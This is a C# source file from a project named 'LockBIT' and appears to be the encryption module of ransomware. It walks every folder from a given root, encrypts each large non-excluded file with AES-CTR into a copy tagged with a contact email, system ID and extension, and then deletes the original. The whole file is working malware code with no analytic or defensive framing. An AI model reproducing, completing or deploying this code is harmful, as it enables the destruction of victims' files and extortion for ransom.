using System;
using System.IO;
using System.Threading;

#nullable disable
namespace LockBIT
{
    internal class LE
    {
        private static readonly string[] disk = Program.disk;

        public static string Key { get; } = Program.Key;

        private static string[] Folder { get; set; }

        private static string[] Files { get; set; }

        public static void RunEncrypt(string label)
        {
            new Thread((ThreadStart)(() => LE.ThreadFolders(label))).Start();
        }

        internal static void ThreadFolders(string lable)
        {
            LE.SearchFile(lable);
            LE.SearchFolder(lable);
        }

        internal static void SearchFolder(string name)
        {
            try
            {
                LE.Folder = Directory.GetDirectories(name, "*", SearchOption.TopDirectoryOnly);
            }
            catch (UnauthorizedAccessException ex)
            {
                return;
            }
            catch (DirectoryNotFoundException ex)
            {
                return;
            }
            catch (IOException ex)
            {
                return;
            }
            catch (Exception ex)
            {
                return;
            }
            foreach (string name1 in LE.Folder)
            {
                LE.SearchFile(name1);
                LE.SearchFolder(name1);
            }
        }

        internal static void SearchFile(string name)
        {
            try
            {
                LE.Files = Directory.GetFiles(name, "*");
            }
            catch (Exception ex)
            {
            }
            foreach (string file in LE.Files)
            {
                try
                {
                    long length = new FileInfo(file).Length;
                    if (!Program.ShouldExclude(file, length))
                    {
                        if (length > 160000000L)
                            LE.EncryptFile(file);
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }

        internal static void EncryptFile(string name)
        {
            try
            {
                Console.WriteLine(name + " Encrypting...");
                File.SetAttributes(name, FileAttributes.Normal);

                string outputFile = $"{name}.{Program.email1}.{Program.systemID}.{Program.Extention}";

                // AES-CTR 방식으로 암호화
                Encryption.EncryptFile(name, outputFile);

                File.Delete(name);
                Console.WriteLine(name + " Encrypted!");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"{name} Error: {ex.Message}");
            }
        }
    }
}
